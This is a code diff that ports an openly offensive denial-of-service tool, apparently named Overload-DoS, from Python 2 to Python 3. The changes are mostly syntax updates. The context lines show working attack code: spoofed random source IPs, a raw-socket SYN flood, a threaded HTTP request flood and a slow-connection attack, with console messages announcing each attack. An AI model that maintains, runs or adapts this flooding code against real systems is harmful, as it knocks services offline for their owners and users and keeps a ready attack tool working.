@@ -23,7 +23,6 @@ title = '''
                                                                   
             Developed by Chris Poole | @codingplanets  			
 		  https://github.com/codingplanets/Overload-DoS
-		          Version: '''+version+'''
 '''
 
 import os
@@ -32,7 +31,7 @@ import json
 import time
 import string
 import signal
-import httplib,urlparse
+import http.client,urllib.parse
 from random import *
 from socket import *
 from struct import *
@@ -45,7 +44,7 @@ signal.signal(signal.SIGPIPE,signal.SIG_DFL)
 
 def fake_ip():
 	skip = '127'
-	rand = range(4)
+	rand = list(range(4))
 	for x in range(4):
 		rand[x] = randrange(0,256)
 	if rand[0] == skip:
@@ -176,7 +175,7 @@ class slow:
 			except KeyboardInterrupt:
 				break
 				sys.exit(cprint('[+] Attack canceled by user','red'))
-		print colored('We\'ve sent ','green') + colored(str(self.pkt_count),'cyan') + colored(' packets successfully. We\'re sleeping for ','green') + colored(self.sleep,'red') + colored(' seconds','green')
+		print(colored('We\'ve sent ','green') + colored(str(self.pkt_count),'cyan') + colored(' packets successfully. We\'re sleeping for ','green') + colored(self.sleep,'red') + colored(' seconds','green'))
 		time.sleep(self.sleep)
 
 class Requester(Thread):
@@ -187,7 +186,7 @@ class Requester(Thread):
 		self.ssl = False
 		self.req = []
 		self.lock=Lock()
-		url_type = urlparse.urlparse(self.tgt)
+		url_type = urllib.parse.urlparse(self.tgt)
 		if url_type.scheme == 'https':
 			self.ssl = True
 			if self.ssl == True:
@@ -228,9 +227,9 @@ class Requester(Thread):
 	def run(self):
 		try:
 			if self.ssl:
-				conn = httplib.HTTPSConnection(self.tgt,self.port)
+				conn = http.client.HTTPSConnection(self.tgt,self.port)
 			else:
-				conn = httplib.HTTPConnection(self.tgt,self.port)
+				conn = http.client.HTTPConnection(self.tgt,self.port)
 				self.req.append(conn)
 			for reqter in self.req:
 				(url,http_header) = self.data()
@@ -238,8 +237,8 @@ class Requester(Thread):
 				reqter.request(method.upper(),url,None,http_header)
 		except KeyboardInterrupt:
 			sys.exit(cprint('[+] Attack canceled by user','red'))
-		except Exception,e:
-			print e
+		except Exception as e:
+			print(e)
 		finally:
 			self.closeConnections()
 	def closeConnections(self):
@@ -329,7 +328,7 @@ class syn(Thread):
 			self.sock.sendto(packet,(self.tgt,0))
 		except KeyboardInterrupt:
 			sys.exit(cprint('[+] Attack Attack canceled by user','red'))
-		except Exception,e:
+		except Exception as e:
 			cprint(e,'red')
 		finally:
 			self.lock.release()
@@ -377,7 +376,7 @@ Example:
 		synsock.setsockopt(IPPROTO_IP,IP_HDRINCL,1)
 		ts=[]
 		threads=[]
-		print colored('[*] SYN flood started on: ','blue')+colored(tgt,'red')
+		print(colored('[*] SYN flood started on: ','blue')+colored(tgt,'red'))
 		while 1:
 			if args.spoof == False:
 				args.fakeip = True
@@ -395,10 +394,10 @@ Example:
 	elif args.request:
 		tgt = args.target
 		threads = []
-		print colored('[*] Starting to send requests to: ','blue')+colored(tgt,'red')
+		print(colored('[*] Starting to send requests to: ','blue')+colored(tgt,'red'))
 		while 1:
 			try:
-				for x in xrange(int(args.threads)):
+				for x in range(int(args.threads)):
 					t=Requester(tgt)
 					t.setDaemon(True)
 					t.start()
@@ -412,8 +411,8 @@ Example:
 			to = float(args.timeout)
 			st = int(args.spoof)
 			threads = int(args.threads)
-		except Exception,e:
-			print '[+]',e
+		except Exception as e:
+			print('[+]',e)
 		while 1:
 			try:
 				worker=slow(tgt,port,to,threads,st)
@@ -422,7 +421,7 @@ Example:
 				sys.exit(cprint('[+] Attack canceled by user','red'))
 	if not (args.syn) and not (args.request) and not (args.slow):
 		parser.print_help()
-		print
+		print()
 		cprint('[+] You must specify attack argument.','red')
 		sys.exit(cprint('[+] -syn | -request | -slow [+]','red'))
 
